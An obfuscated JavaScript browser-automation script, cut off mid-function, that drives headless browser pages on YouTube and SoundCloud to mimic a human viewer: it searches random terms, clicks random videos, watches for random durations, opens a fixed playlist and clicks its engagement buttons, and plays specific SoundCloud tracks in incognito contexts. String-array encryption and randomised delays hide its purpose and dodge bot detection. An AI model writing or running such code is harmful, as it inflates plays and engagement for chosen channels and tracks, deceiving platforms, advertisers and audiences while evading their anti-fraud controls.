const W = d,
  V = c,
  U = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1ff3 + -0x1 * -0x1ea1 + 0x153))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0xa6 * 0x1 + 0x18dc + 0x1982 * -0x1), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x3 * -0x2287 + -0x804 + -0xae5 * -0x15 + (-0x1 * 0x53e2 + 0x538c + -0x13 * -0x31a) * random()) : await standardWaitForNetIdle(f), await wait(0xf87 + -0x2f * -0x3f + -0x790 + (-0xa08 * -0x5 + -0x46ff + -0x5 * -0xbfb) * random()), -0x6 * 0x5c2 + -0x1731 + 0x39be;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x25 * -0x2e + 0x13e5 + -0x97 * 0x2d);
    let h = e[f];
    if (c['dCnizZ'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x2185 + -0x2 * 0x119f + 0x44c3, r, s, t = 0xe95 + -0x35b + -0x59d * 0x2; s = m['charAt'](t++); ~s && (r = q % (-0x1 * -0x1ea1 + -0xc24 + 0x1279 * -0x1) ? r * (0x25c6 + 0x2350 * 0x1 + -0x48d6) + s : s, q++ % (-0x1 * 0x156 + -0xdf * -0xd + -0x9f9)) ? o += String['fromCharCode'](0x1bd9 + 0x136d + -0xb * 0x435 & r >> (-(0xf87 + -0x2f * -0x3f + -0x1b16) * q & -0x645 * -0x4 + -0x2380 + -0x7 * -0x17e)) : -0x6 * 0x5c2 + -0x1731 + 0x39bd) {
          s = n['indexOf'](s);
        }
        for (let u = -0x2070 + -0xf2 + 0x10b1 * 0x2, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x25bb + 0x1085 + 0x1546))['slice'](-(-0x1e5 * -0x6 + -0x1 * -0x1163 + 0x29d * -0xb));
        }
        return decodeURIComponent(p);
      };
      c['faPdbs'] = i, b = arguments, c['dCnizZ'] = !![];
    }
    const j = e[0xc80 + 0x4a5 * 0x1 + 0x1 * -0x1125],
      k = f + j,
      l = b[k];
    return !l ? (h = c['faPdbs'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x2070 + -0xf2 + 0x209 * 0x1a), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x25bb + 0x1085 + 0x1537;
}
async function randomWait() {
  return await wait(-0x1e5 * -0x6 + -0x1 * -0x1163 + 0x313 * -0x3 + (0xc80 + 0x4a5 * 0x1 + 0x1 * 0x263) * random()), -0x2 * 0x71f + 0x1c88 + -0xe49;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = d;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + R(0x2) + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x12be + 0x16f * 0x3 + 0xe71, -0x11 * -0x152 + 0x535 * -0x2 + -0xc01), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x11f1 * 0x7 + 0x8cd8 + -0x11b * 0x1d) * getRandomInt(0x2 * 0x8d1 + 0x1d03 + 0x1 * -0x2ea3, -0x2280 + -0x1 * 0xae0 + -0x1 * -0x2d65), h)), 0x1bb + -0x1126 + 0x2 * 0x7b6;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x25 * -0x2e + 0x13e5 + -0x97 * 0x2d);
    let h = e[f];
    return h;
  }, d(b, c);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x25 * -0x2e + 0x13e5 + -0x97 * 0x2d);
    let h = e[f];
    if (b['xQdUns'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x2185 + -0x2 * 0x119f + 0x44c3, s, t, u = 0xe95 + -0x35b + -0x59d * 0x2; t = n['charAt'](u++); ~t && (s = r % (-0x1 * -0x1ea1 + -0xc24 + 0x1279 * -0x1) ? s * (0x25c6 + 0x2350 * 0x1 + -0x48d6) + t : t, r++ % (-0x1 * 0x156 + -0xdf * -0xd + -0x9f9)) ? p += String['fromCharCode'](0x1bd9 + 0x136d + -0xb * 0x435 & s >> (-(0xf87 + -0x2f * -0x3f + -0x1b16) * r & -0x645 * -0x4 + -0x2380 + -0x7 * -0x17e)) : -0x6 * 0x5c2 + -0x1731 + 0x39bd) {
          t = o['indexOf'](t);
        }
        for (let v = -0x2070 + -0xf2 + 0x10b1 * 0x2, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x25bb + 0x1085 + 0x1546))['slice'](-(-0x1e5 * -0x6 + -0x1 * -0x1163 + 0x29d * -0xb));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xc80 + 0x4a5 * 0x1 + 0x1 * -0x1125,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x2 * 0x71f + 0x1c88 + -0xe4a; u < -0x12be + 0x16f * 0x3 + 0xf71; u++) {
          p[u] = u;
        }
        for (u = -0x11 * -0x152 + 0x535 * -0x2 + -0xc08; u < 0x8d * 0x13 + 0xbbd + -0x5c * 0x3b; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x2 * 0x8d1 + 0x1d03 + 0x13 * -0x267), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x2280 + -0x1 * 0xae0 + -0x16 * -0x210, q = 0x1bb + -0x1126 + 0x1 * 0xf6b;
        for (let v = 0x20fd + 0x2099 + 0x20cb * -0x2; v < n['length']; v++) {
          u = (u + (0x5 * -0x144 + -0x1 * -0xf4f + -0x8fa)) % (0x2 * 0xd60 + -0x1 * -0x4a2 + -0xf31 * 0x2), q = (q + p[u]) % (-0x2139 + 0x8f4 + 0x1945), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1f44 + 0x2a2 * -0xb + 0x3d3a)]);
        }
        return t;
      };
      b['dxJnep'] = m, c = arguments, b['xQdUns'] = !![];
    }
    const j = e[-0x80f * -0x3 + 0x1 * 0x8c9 + 0x20f6 * -0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['EOLAos'] === undefined && (b['EOLAos'] = !![]), h = b['dxJnep'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x20fd + 0x2099 + 0x20cb * -0x2;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x5 * -0x144 + -0x1 * -0xf4f + -0x8fa]['split']('\x20');
    for (let k = 0x2 * 0xd60 + -0x1 * -0x4a2 + -0xce * 0x27; k < i['length']; k += -0x2139 + 0x8f4 + 0x1847)
      j += i[k] * h[i[k + (-0x1f44 + 0x2a2 * -0xb + 0x3c3b)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x80f * -0x3 + 0x1 * 0x8c9 + 0x20f0 * -0x1)['map'](l => Array['from'](l['children']))['flat'](-0x2372 + -0x9 * 0x3f3 + -0xe9 * -0x4e)['map'](l => l['childNodes'][-0xf * 0x22d + -0x1bbd + -0x1d * -0x215]['childNodes'][-0x15d0 + 0x1373 + 0x25d * 0x1]['childNodes'][-0xcf6 + 0xaa2 + 0x255]['childNodes'][-0x25e2 + 0xd8 + 0x250a]['childNodes'][-0x3 * 0x137 + -0x2646 + 0x29ec * 0x1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x24b2 + 0x2da + 0x25c0, 0x799 * 0x3 + -0x15ea + 0x12a7)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x1 * 0x2d52 + -0x15c9 + 0x7db3);
  const h = await getMaxTime(f),
    i = Math['min']((0x1ca8b + 0x1d * -0x8f9 + 0x526 * 0x7) * getRandomInt(0x1a69 * 0x1 + 0x6ad * -0x1 + -0xca * 0x19, -0x9 * -0x405 + 0x2 * 0x989 + -0x373a), h);
  return await wait(i), -0x104b * -0x2 + -0xe7a + 0x609 * -0x3;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1855 + 0x1e5c + -0x1 * 0x607]['children'][-0x1e35 + 0x3 * 0x245 + 0x1766]['children'][-0x1d27 * -0x1 + 0x1e17 + -0x3b3e]['children'][0x26a + -0x104f + -0x1 * -0xde5]['children'][0x60c + 0x7 * -0x9d + 0x1c1 * -0x1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1e3f + -0x14c1 + -0x97d;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x237d * 0x1 + -0x1 * -0x22d + 0x2cf * 0xc + (-0x1711 + 0x12dd * 0x1 + -0x2 * -0x233) * random()
  }), await wait(-0x1977 + -0x12d1 + 0x2e3c + (-0x2632 + -0xcc + 0x282a) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x26c4 + 0x2105 * -0x1 + -0x1 * 0x5bd]['childNodes'][-0xa75 + 0x11f3 + -0x77d]['childNodes'][0x2b * -0x19 + 0x486 * -0x3 + 0x11c6]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1 * 0x2467 + 0x2 * -0xf9 + -0x2270]['childNodes'][0x14 * -0x87 + -0x23b6 + -0x1721 * -0x2]['childNodes'][-0x62a + -0x2bc + 0x8e8]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x14d9 + -0x11bb * -0x1 + 0x31f),
          r = -0x1fe9 + 0x1b * 0x8b + 0x1140;
        for (let u = -0x1579 + -0x1c35 + 0x1 * 0x31ae; u < q['length']; u += 0x5e8 + 0x9 * 0x91 + 0x5 * -0x233)
          r += q[u] * k[q[u + (0x25 * 0x43 + 0x69f + -0x104d)]];
        return r;
      }(n);
  });
  await wait((0x2e3e + -0x68f3 + 0x754d) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x3188 + -0x6c6e + -0x18856 * -0x1) * getRandomInt(-0x1c1b * 0x1 + 0xb * 0x28d + 0x1 * 0xd, -0x1809 + 0x2652 + -0xe3f), h + (-0x3cc + 0x267a + -0xf26));
  return await wait(i), -0x1b + -0x1ad3 * -0x1 + -0x1ab7;
}
async function keyWatch(f) {
  const S = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x35 * 0x1f + 0x6 * 0x53e + -0xd * 0x1ed), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + S(0xe, '!iux') + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + S(0x15, 'ZoJY') + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2 * 0xcd6 + -0x846 + 0x16d5 * 0x2 + (0x2049 + 0x2350 + 0x3 * -0x153b) * Math['random']());
    });
  }, 0x3e1 + -0x123 + 0x189a);
  await wait(0x2e * 0x1cab + -0x4b23 + -0x47b7 * 0x1);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x2 * 0x93be + 0x18b39 + -0x1c855) * getRandomInt(0x1115 * -0x1 + 0x1707 + -0x5ee, 0x527 + -0x39 * -0xa1 + 0x25 * -0x11b)), clearInterval(h), -0x117d + 0x599 + 0xbe5;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x12bb + -0xd07 + 0x65a * 0x5;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x3d * 0x69 + 0x1 * -0x971 + 0x2277 * 0x1;
    await randomWait();
  }
  return 0x4c7 * -0x2 + 0xb2 * 0x31 + -0x1883;
}

function fetchRandomSC() {
  return Math['random']() <= 0xd * 0x96 + 0xe2 * -0xa + 0x5 * 0x3e + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1bed + 0xf * 0x116 + 0xba3 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const T = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x153 * -0xe + 0x2204 + -0x348e + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x216c + 0x963 + -0x125 * -0x15;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x1250b + -0x1e5b + 0x338 * -0x1b + getRandomInt(0x41dd + 0x1598 * 0x1 + 0x1cdd * -0x1, -0x2f * -0x133 + 0x97f3 + -0x5b20));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1902 + -0x2c * -0x7 + 0x17cf), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x37f + 0x1 * 0x2231 + -0xc9 * 0x30;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0xffd + -0x1a1c + 0x1 * 0xa1f, -0x1d * 0xd9 + -0x4a2 * -0x3 + 0xae1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })[T(0x3)](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x2111 * 0x1 + -0x1df8 + 0x4b7 + floor((0x1157 + 0x1d1 * -0x8 + 0x119) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x68f39a4a + 0x2 * 0x317d4eff + 0x85f8fc4c),
          -0x76ec97 + -0x4b25fa + -0xf61f * -0x14f,
          0xab0c + -0xe3c * -0x3 + -0x55c0,
          -0x30b * 0x2 + -0x1f5b + -0xb * -0x373
        ], y = [
          -0xda * 0x26 + -0xd6f + 0x2de3 * 0x1,
          0x913 + -0x18ed * 0x1 + -0xfea * -0x1,
          -0x132d + 0xbe0 + 0x755,
          0x1 * -0x43 + 0x127 * 0x5 + 0x20 * -0x2c
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x18be + 0x1dd3 + 0x41 * -0x14)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1fed * -0x1 + 0x1763 + 0x88a; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x344 + 0x3d * 0x3e + 0x3d6 * -0x3) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x2 * -0x1350 + -0x2b1 + -0x23ef] = A[0x1c84 + 0x4c4 + -0x109c * 0x2] = A[0x807 + -0x1157 * 0x2 + -0x2 * -0xd54] = A[-0x23c9 + 0x6ef * -0x1 + -0x2aba * -0x1] = A[-0x52 * -0x1d + 0x6f6 + 0x1 * -0x103d] = A[-0x1472 + -0x3 * 0x2b + -0x14f7 * -0x1] = A[0x10 * -0x9 + -0x14d5 + 0x156a] = A[0x182 * -0xf + 0x1 * 0x9cd + 0xcd7] = A[-0x3c3 * 0x1 + 0x83 * -0x2f + 0x1bd7] = A[-0x20 * 0x6f + -0x1 * -0xe49 + -0x61] = A[0x498 * -0x1 + 0x2 * 0x107b + -0x1c55 * 0x1] = A[-0x1484 + 0x5bd + 0xed1 * 0x1] = A[0x17c8 + 0x2600 + -0x1 * 0x3dbd] = A[-0x270 + -0x7d + -0x2f9 * -0x1] = A[0xc17 + -0x132b + 0x721] = A[0x3f5 + 0xad * 0x1 + -0x24a * 0x2] = A[-0x2050 + -0x44f * -0x1 + -0x4 * -0x704] = 0x3 * -0xb6f + -0x7 * -0x54 + 0xaab * 0x3, this['blocks'] = A) : this['blocks'] = [
                0x22d4 + 0x1 * -0xa39 + -0x189b,
                0x25b9 + -0x76a + -0x1e4f * 0x1,
                -0x6e2 * -0x2 + 0x1348 + 0x843 * -0x4,
                0x1c00 + 0x1127 + -0x2d27 * 0x1,
                0x2675 + -0x107f + -0x1 * 0x15f6,
                -0x1d20 + 0xcde + 0x1 * 0x1042,
                0x51e + -0x4be + -0x60,
                0x2df + 0xd74 * 0x1 + -0x1053 * 0x1,
                -0x2f * 0xcd + 0x1 * -0x1a2f + -0x2 * -0x1fe9,
                0xb3f * 0x3 + -0x19 * -0x3d + -0x27b2,
                -0x19ed + -0xf * -0x107 + 0xa84,
                0xa6e + -0x849 * -0x3 + -0x2349,
                -0x153d + -0x875 * 0x1 + 0x43e * 0x7,
                -0x19 * 0x14f + 0x1c3f * 0x1 + 0x16 * 0x34,
                0x324 + -0x2b * 0x7f + 0x1231 * 0x1,
                0x1a7 * -0x5 + -0x1 * -0xa52 + -0x20f,
                -0x16c3 * -0x1 + -0x409 + -0x12ba
              ], this['h0'] = 0x1f54b896 + -0x1 * -0x927b08d3 + -0x4a8a9e68, this['h1'] = 0x59ac3d * -0x1ae + -0x71e65a10 + 0x1f853540f, this['h2'] = 0x1 * -0x2542cbe9 + 0x44944f82 + -0x79695965 * -0x1, this['h3'] = -0x1934d118 + 0x421e4c7 + -0xc6c6aed * -0x3, this['h4'] = 0x17d * 0x113071 + 0x2ac0b * 0xfbb + -0x803578ba * -0x1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1c * -0x4f + 0x1eda + -0x1636, this['finalized'] = this['hashed'] = 0x9cc + 0x6df * 0x1 + -0x10ab, this['first'] = -0x162c + -0x1fa9 + 0x1aeb * 0x2;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x69e * -0x5 + 0x20c + 0x6 * -0x5db, O = J['length'] || -0x35 * 0xb3 + -0x73b + 0x2c4a, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1ceb + -0x1 * 0x1daa + -0xbf * -0x1, P[-0x1e32 + -0x1a51 + -0x17 * -0x275] = this['block'], P[-0x86f * 0x1 + 0x492 * 0x4 + 0xa7 * -0xf] = P[0x3 * 0x66f + -0x22c + -0x1120] = P[-0x2349 + -0x1 * 0x3d6 + 0x2721] = P[0x6 * -0x3b + 0x185 * 0xb + 0x35 * -0x4a] = P[0x225e + 0x1 * 0xff7 + -0x3251] = P[-0xe9b + 0xdce + 0xd2] = P[0xada + -0x1718 + 0xc44] = P[-0x11cf * 0x1 + -0xc05 + 0x1 * 0x1ddb] = P[0x1f7 * 0xd + -0x9 * -0x443 + -0x3fde] = P[0x465 * -0x1 + -0x1 * 0x89a + 0x684 * 0x2] = P[0x1b86 + -0x2d * 0x1 + 0x1b4f * -0x1] = P[-0x7cc * -0x1 + -0x1d5f + 0x2 * 0xacf] = P[0x1 * 0x1b6d + 0x1 * 0x1951 + -0x34b2] = P[0x43 * 0x5f + -0x6b * -0x53 + -0x3b81] = P[0xdec * -0x1 + 0x38 * 0x25 + 0x5e2] = P[-0x157e * -0x1 + 0x1 * 0xbc1 + -0x2130] = 0x2683 * 0x1 + -0x1e39 + -0x84a), K) {
                    for (N = this['start']; M < O && N < 0x1 * -0x1f16 + -0x2424 + 0x437a; ++M)
                      P[N >> 0x4d6 + -0x1b * -0xb7 + -0x1821] |= J[M] << y[-0x1 * -0x6f1 + -0x3a9 + -0x345 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1e86 + -0x1566 + -0xd4 * -0x3f; ++M)
                      (L = J['charCodeAt'](M)) < -0x2 * -0x5b9 + -0xd * -0x15d + -0x1cab ? P[N >> 0x1021 * 0x2 + 0x1b * -0xfd + -0x39 * 0x19] |= L << y[-0xa * -0x209 + -0x9f * 0x13 + 0x2 * -0x445 & N++] : L < 0xc59 * 0x1 + -0xd8a + 0x931 ? (P[N >> -0x22 * -0x121 + -0x1 * -0x186a + -0xa77 * 0x6] |= (-0x12f9 * 0x2 + -0x1e27 + 0x44d9 | L >> -0x1a * -0x26 + 0x2 * 0x68f + -0x23 * 0x7c) << y[-0xf22 + 0x1545 + -0x620 & N++], P[N >> -0x10 * 0x1ce + -0x14e9 + 0x31cb] |= (-0x96 * 0x17 + 0xd75 + 0x85 | 0xb6b + 0x1de0 + -0x290c & L) << y[0xa70 + 0x1005 * -0x1 + 0x2 * 0x2cc & N++]) : L < 0x1e71 + -0xd39 + 0xc6c8 || L >= -0xc93d + 0x3895 + 0x1f6 * 0xbc ? (P[N >> -0x31 * -0xa4 + -0xc6b + -0x12f7] |= (-0x46d + -0x5 * -0x32 + 0x453 | L >> -0xa18 + -0x989 * -0x1 + 0x9b) << y[0x10a3 + 0x167d + -0x271d & N++], P[N >> -0x7cb * 0x3 + 0x1e1e + -0x6bb] |= (0x20d0 + 0x1087 + 0x30d7 * -0x1 | L >> 0x1a51 + 0x9b8 + -0x2403 & 0xfbe + 0x3b5 + 0x1334 * -0x1) << y[-0x84c + -0x2 * -0x1181 + 0x5 * -0x557 & N++], P[N >> 0x10 * 0x189 + 0x249 + -0x1ad7] |= (-0x1f89 + -0x167 * 0x5 + 0x24c * 0x11 | 0x1e2d + -0xbd5 + -0x1219 & L) << y[0x22b + 0x301 + -0x529 & N++]) : (L = -0x534b + -0x83 + 0x153ce + ((-0x18e + -0x26b1 + 0x2c3e & L) << -0x1 * -0x2359 + 0xf53 + -0x32a2 | 0x22eb + 0x1eb0 * 0x1 + -0x3d9c & J['charCodeAt'](++M)), P[N >> 0x8be * -0x2 + 0x19ef + -0x871] |= (0x25 * -0x8b + -0x1f * 0x12d + 0x397a | L >> -0xd0 * 0x17 + -0x1 * 0x24a5 + 0x1 * 0x3767) << y[0x1 * 0x14e4 + 0x2348 + 0xb * -0x51b & N++], P[N >> 0x1 * -0x2bd + 0x1c07 + -0x2 * 0xca4] |= (0x2ad + 0x262e + -0x285b | L >> 0x2b6 + -0x22 * 0x29 + 0x2c8 & 0x10b6 + -0x20 * 0x40 + -0x1 * 0x877) << y[0xb8c + 0xc7 * -0xf + 0x20 & N++], P[N >> -0x5aa * 0x1 + -0x7e7 + -0xd93 * -0x1] |= (-0x1c16 + 0x1 * -0x13e + 0x1dd4 | L >> 0x140e + -0x1204 * -0x2 + -0x3810 & 0x30 * -0xd + 0xbeb + -0x93c) << y[-0x75f + 0x1 * -0xfde + -0x18 * -0xf8 & N++], P[N >> 0x2 * -0x5c + 0x2013 + -0x1f59] |= (0xdec + 0x223 * -0xd + 0xe5b | 0x211e + -0x1509 + -0xbd6 & L) << y[0x24d8 * 0x1 + 0x11fe + -0x36d3 & N++]);
                  }
